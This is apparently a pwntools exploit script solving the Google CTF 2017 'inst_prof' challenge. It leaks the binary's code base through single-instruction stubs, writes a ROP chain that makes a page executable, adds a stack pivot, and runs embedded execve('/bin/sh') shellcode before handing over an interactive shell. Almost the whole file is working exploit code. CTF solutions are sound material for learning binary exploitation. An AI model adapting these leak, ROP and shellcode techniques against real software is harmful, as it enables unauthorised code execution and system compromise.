#
# Google CTF 2017 pwn inst_prof
#
# Based on
# * https://develbranch.com
#

from pwn import *
import sys

b = ELF('./inst_prof')

context.arch = b.arch
context.log_level = 'info'

r = process('./inst_prof')

def assemble(code):
    encoding = asm(code)
    if len(encoding) > 4:
        raise Exception("TOO LONG! code=%s, len=%d" % (code, len(encoding)))
    while len(encoding) < 4:
        encoding += '\xc3'
    return encoding

def movb_r15(n):
    if n <= 0x7f:
        return assemble('push %d; pop r15' % n)
    else:
        return assemble('xor r15, r15') + assemble('inc r15') * n

def store_r15(stack_off):
    return assemble('push rsp; pop r14') + assemble('inc r14') * stack_off + assemble('mov [r14], r15')

def load_to_r15(stack_off):
    return assemble('push rsp; pop r14') + assemble('inc r14') * stack_off + assemble('mov r15, [r14]')

# add rsp,0x1000 -> push rsp into 'rw-' region
adjust_stack = "\x48\x81\xC4\x00\x10\x00\x00" 

# Execute /bin/sh - 27 bytes : http://shell-storm.org/shellcode/files/shellcode-806.php
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" 

def recv_all():
    b = ""
    last_recv = True
    while last_recv:
        try:
            last_recv = r.recv(1024)
        except socket.timeout:
            last_recv = None
        if last_recv:
            b += last_recv
    return b

if __name__ == "__main__":

    r.recvuntil('ready')

    r.settimeout(0.5)

    #
    # leak the address of 0x8a2: mov edx,6
    #
    r.send(assemble('mov r14,[rsp]'))
    r.send(assemble('dec r14; ret') * (0xb18 - 0x8a2))
    recv_all()

    r.send(assemble('push rsp; pop rsi; push r14'))
    d = recv_all()
    l = d[len(d)-6:len(d)] + '\x00\x00'
    l = u64(l)
    B = l - 0x8a2
    log.info("code base: 0x%x" % B)

    pop_rdi = 0xbc3 # pop rdi; ret
    offset = 56

    log.info("building opcodes...")

    bytes = ''
    bytes += p64(B + pop_rdi)               # 0x0
    bytes += p64(0)                         # 0x8
    bytes += p64(B + b.plt['alarm'])        # 0x10
    bytes += p64(B + pop_rdi)               # 0x18
    bytes += p64(0xcafebabe)                # 0x20
    bytes += p64(B + 0xa20)                 # 0x28, make_page_executable()
    bytes += p64(0xcafebabe)                # 0x30, (adjust_stack + shellcode)
    bytes += adjust_stack                   # 0x38
    bytes += shellcode

    op = ''
    op += assemble('push rsp; pop r14')
    op += assemble('inc r14') * offset
    for x in bytes:
        op = op + assemble('movb [r14], %#x' % ord(x)) + assemble('inc r14')

    op += assemble('mov r14,rcx')
    op += assemble('push rsp; pop r15')
    op += assemble('dec r14')
    op += assemble('not r14')
    op += assemble('and r15,r14')
    op += store_r15(offset + 0x20)

    op += assemble('push rsp; pop r15')
    op += assemble('inc r15') * (offset + 0x38)
    op += store_r15(offset + 0x30)

    op += movb_r15(offset)
    op += assemble('add rsp,r15; ret')      # stack pivot

    log.info("sending %d bytes..." % len(op))
    r.send(op)
    r.clean()
    r.interactive()
